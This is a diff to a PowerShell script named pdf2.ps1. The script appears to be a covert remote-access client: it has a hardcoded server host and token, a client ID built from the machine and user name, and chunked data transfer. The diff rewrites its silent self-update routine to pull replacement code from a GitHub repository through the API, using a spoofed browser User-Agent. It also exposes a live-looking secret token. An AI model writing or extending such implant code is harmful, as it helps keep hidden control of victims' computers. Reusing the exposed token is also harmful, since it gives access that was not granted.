@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.5"
+$Version = "3.2.6"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -11,7 +11,8 @@ $maxChunkBytes = 32000  # cap per-chunk size
 $clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"
 
 # --- AUTO-UPDATE CONFIG (removable) ---
-$updateUrl = "https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1"
+$updateUrl    = "https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1"
+$updateApiUrl = "https://api.github.com/repos/pentoshi007/test/contents/pdf2.ps1"
 $updateCheckMins = 30   # check for updates every N minutes
 # --- end auto-update config ---
 
@@ -153,17 +154,25 @@ function Update-Self {
     try {
         $script:lastUpdateCheck = Get-Date
 
-        # Download latest version to temp file
+        # Download latest version via GitHub API (bypasses CDN cache entirely)
         $tempFile = Join-Path $env:TEMP "pdf2_update_$(Get-Random).ps1"
         try {
             [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
+            # Step 1: hit the Contents API to get the commit-pinned download_url
             $wc = New-Object System.Net.WebClient
             $wc.Headers.Add("User-Agent", "Mozilla/5.0")
             $wc.Headers.Add("Cache-Control", "no-cache, no-store")
             $wc.Headers.Add("Pragma", "no-cache")
-            $cacheBust = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
-            $wc.DownloadFile("$updateUrl?t=$cacheBust", $tempFile)
+            $apiJson   = $wc.DownloadString($updateApiUrl)
             $wc.Dispose()
+            # Extract download_url — it contains the commit SHA so it's never CDN-cached
+            $dlUrl = ($apiJson | Select-String '"download_url"\s*:\s*"([^"]+)"').Matches[0].Groups[1].Value
+            if (-not $dlUrl) { throw 'Could not parse download_url from GitHub API response' }
+            # Step 2: download from the commit-pinned URL
+            $wc2 = New-Object System.Net.WebClient
+            $wc2.Headers.Add("User-Agent", "Mozilla/5.0")
+            $wc2.DownloadFile($dlUrl, $tempFile)
+            $wc2.Dispose()
         } catch {
             Write-Log "Update download failed: $($_.Exception.Message)" "WARN"
             return $false
